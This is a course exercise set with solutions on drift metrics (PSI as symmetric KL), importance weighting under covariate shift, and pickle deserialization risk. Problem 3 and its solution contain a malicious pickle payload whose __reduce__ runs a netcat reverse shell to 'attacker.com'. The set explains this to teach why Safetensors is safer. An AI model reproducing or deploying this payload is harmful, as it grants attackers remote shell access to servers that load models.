# Topic 10.4: Exercises & Solutions — ML Pipelines & Production Systems

---

## Problem Set Overview

These exercises explore the mathematical foundations of distribution drift, covariate shift importance weighting, and the software security implications of model serialization.

---

### Problem 1: Mathematical Proof of PSI Equivalence to Symmetric KL Divergence

The Population Stability Index is computed across $B$ discrete bins as:
$$\text{PSI} = \sum_{b=1}^B (P_b - Q_b) \ln\left(\frac{P_b}{Q_b}\right)$$
where $P_b$ is the probability mass in bin $b$ for the production distribution $P$, and $Q_b$ is the mass in bin $b$ for the baseline reference distribution $Q$.

**Questions:**
1. Prove algebraically that $\text{PSI}(P, Q) = D_{\text{KL}}(P \parallel Q) + D_{\text{KL}}(Q \parallel P)$, where $D_{\text{KL}}$ is the discrete Kullback-Leibler divergence.
2. Show that $\text{PSI}(P, Q) \ge 0$, and state the exact condition for which $\text{PSI}(P, Q) = 0$.
3. Why is symmetry $\text{PSI}(P, Q) = \text{PSI}(Q, P)$ an essential engineering property for monitoring?

---

### Solution 1

1. **Algebraic Proof:**
   Recall the definition of discrete Kullback-Leibler divergence:
   $$D_{\text{KL}}(P \parallel Q) = \sum_{b=1}^B P_b \ln\left(\frac{P_b}{Q_b}\right)$$
   $$D_{\text{KL}}(Q \parallel P) = \sum_{b=1}^B Q_b \ln\left(\frac{Q_b}{P_b}\right)$$
   Using the log identity $\ln(Q_b / P_b) = -\ln(P_b / Q_b)$:
   $$D_{\text{KL}}(Q \parallel P) = -\sum_{b=1}^B Q_b \ln\left(\frac{P_b}{Q_b}\right)$$
   Adding the two divergences:
   $$D_{\text{KL}}(P \parallel Q) + D_{\text{KL}}(Q \parallel P) = \sum_{b=1}^B P_b \ln\left(\frac{P_b}{Q_b}\right) - \sum_{b=1}^B Q_b \ln\left(\frac{P_b}{Q_b}\right)$$
   Factoring out the common logarithmic term:
   $$D_{\text{KL}}(P \parallel Q) + D_{\text{KL}}(Q \parallel P) = \sum_{b=1}^B (P_b - Q_b) \ln\left(\frac{P_b}{Q_b}\right) = \text{PSI}(P, Q)$$
   $\blacksquare$

2. **Non-negativity Proof:**
   By Gibbs' inequality (or Jensen's inequality applied to $-\ln(t)$):
   $$D_{\text{KL}}(P \parallel Q) \ge 0 \quad \text{and} \quad D_{\text{KL}}(Q \parallel P) \ge 0$$
   Because both terms are non-negative, their sum is non-negative:
   $$\text{PSI}(P, Q) \ge 0$$
   Equality $\text{PSI}(P, Q) = 0$ holds if and only if $P_b = Q_b$ for all bins $b \in \{1, \dots, B\}$, indicating identical distributions.

3. **Engineering Importance:**
   Standard KL divergence is asymmetric: $D_{\text{KL}}(P \parallel Q) \ne D_{\text{KL}}(Q \parallel P)$. If an alerting system relied on standard KL divergence, swapping the reference dataset and the incoming production batch would yield completely different drift scores. PSI's symmetry ensures that the measure of dissimilarity between baseline and production is invariant to directional ordering.

---

### Problem 2: Importance Weighting for Covariate Shift

Suppose an autonomous drone's vision model was trained on data drawn from training distribution $P_{\text{tr}}(X)$, but deployed in a new city with production distribution $P_{\text{deploy}}(X)$.
Assume that covariate shift holds:
$$P_{\text{deploy}}(Y \mid X) = P_{\text{tr}}(Y \mid X)$$
The true production generalization risk is:
$$R_{\text{deploy}}(f) = \mathbb{E}_{(X,Y)\sim \mathcal{P}_{\text{deploy}}}[L(f(X), Y)]$$

**Questions:**
1. Derive an expression expressing $R_{\text{deploy}}(f)$ as an expectation under the training distribution $\mathcal{P}_{\text{tr}}$.
2. Define the importance weight function $w(x)$.
3. Explain why importance weighting fails if the support of the training distribution does not cover the production distribution ($\text{supp}(P_{\text{deploy}}) \not\subseteq \text{supp}(P_{\text{tr}})$).

---

### Solution 2

1. **Derivation:**
   Writing out the expectation in continuous integral form:
   $$R_{\text{deploy}}(f) = \int \int L(f(x), y) P_{\text{deploy}}(x, y) \, dx \, dy$$
   Factoring the joint distribution:
   $$P_{\text{deploy}}(x, y) = P_{\text{deploy}}(y \mid x) P_{\text{deploy}}(x)$$
   Since covariate shift holds, $P_{\text{deploy}}(y \mid x) = P_{\text{tr}}(y \mid x)$:
   $$R_{\text{deploy}}(f) = \int \int L(f(x), y) P_{\text{tr}}(y \mid x) P_{\text{deploy}}(x) \, dx \, dy$$
   Multiplying and dividing by $P_{\text{tr}}(x)$ (assuming $P_{\text{tr}}(x) > 0$):
   $$R_{\text{deploy}}(f) = \int \int L(f(x), y) \left[\frac{P_{\text{deploy}}(x)}{P_{\text{tr}}(x)}\right] P_{\text{tr}}(y \mid x) P_{\text{tr}}(x) \, dx \, dy$$
   Since $P_{\text{tr}}(y \mid x) P_{\text{tr}}(x) = P_{\text{tr}}(x, y)$:
   $$R_{\text{deploy}}(f) = \mathbb{E}_{(X,Y)\sim \mathcal{P}_{\text{tr}}}\left[ w(X) L(f(X), Y) \right]$$

2. **Importance Weight:**
   $$w(x) = \frac{P_{\text{deploy}}(x)}{P_{\text{tr}}(x)}$$
   During offline training, we can optimize the model for production performance by weighting each training sample $(x_i, y_i)$ by the density ratio $w(x_i)$.

3. **Support Violation:**
   If there exists a region in feature space where $P_{\text{deploy}}(x) > 0$ but $P_{\text{tr}}(x) = 0$, the denominator is zero and the density ratio $w(x) \to \infty$. In this region, the training data contains zero samples, making empirical estimation of $P(Y \mid X)$ mathematically impossible. The model cannot generalize to unseen domains with zero training support.

---

### Problem 3: The Pickle Security Exploit & Safetensors Alternative

A machine learning hosting platform allows users to upload custom PyTorch or Scikit-Learn model weights. An attacker uploads a file named `model.pkl` created with the following payload:
```python
class Exploit:
    def __reduce__(self):
        import os
        return (os.system, ("nc -e /bin/sh attacker.com 4444",))
```

**Questions:**
1. Explain step-by-step what happens inside the Python interpreter when `pickle.load(f)` executes on this file.
2. Why is this vulnerability inherent to the design of the pickle protocol?
3. How does the `Safetensors` format eliminate this vulnerability at the architectural level?

---

### Solution 3

1. **Interpreter Execution Flow:**
   - The `pickle` byte stream encodes an instruction to instantiate an object using the tuple returned by `__reduce__()`.
   - The first element of the tuple is a callable function: `os.system`.
   - The second element is the argument tuple passed to that callable: `("nc -e /bin/sh attacker.com 4444",)`.
   - When `pickle.load()` reconstructs the object, the virtual machine immediately invokes `os.system("nc -e /bin/sh attacker.com 4444")`, spawning a reverse shell connecting the server to the attacker's terminal before returning any object to the caller.

2. **Inherent Architectural Flaw:**
   `pickle` was designed for arbitrary object serialization, allowing classes to define custom reconstruction logic. It does not separate data from executable code; it embeds instructions for creating arbitrary Python functions, classes, and OS bindings. Sanitizing or "whitelisting" pickle streams is notoriously difficult and almost always bypassable.

3. **Safetensors Design Defense:**
   - **Zero Code Execution:** `Safetensors` contains no bytecode, no class instantiation hooks, and no execution VM.
   - **Strict Architecture:** The file format consists of:
     1. An 8-byte integer indicating header length $N$.
     2. An $N$-byte pure UTF-8 JSON header containing metadata (tensor names, data types like `F32`, shapes like `[768, 768]`, and exact byte offsets).
     3. Raw, uncompressed, continuous byte buffers for the tensor weights.
   - Reading a Safetensors file uses `mmap` (memory mapping) directly into CPU/GPU memory without running any user code, making remote arbitrary code execution physically impossible.
